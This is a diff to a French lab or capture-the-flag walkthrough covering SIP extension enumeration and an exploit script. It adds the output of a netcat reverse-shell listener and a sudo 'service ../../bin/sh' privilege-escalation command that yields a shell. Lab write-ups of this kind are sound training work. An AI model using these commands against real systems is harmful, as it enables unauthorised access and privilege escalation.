@@ -63,7 +63,7 @@ ERROR:TakeASip:Response: 'SIP/2.0 401 Unauthorized\r\nVia: SIP/2.0/UDP 127.0.1.1
 WARNING:TakeASip:We got an unknown response
 ```
 
-comment le trouvé seul cette extension en regardant la doc ?
+comment le trouver seul cette extension en regardant la doc ?
 
 Bonne question à se poser. Plusieurs façons :
 
@@ -102,6 +102,12 @@ python2 18650.py
 ```bash
 # Réception du reverse shell
 nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.17.68] from (UNKNOWN) [10.129.229.183] 34650
+sudo service ../../bin/sh
+id 
+uid=100(asterisk) gid=101(asterisk)
+
 ```
 
 
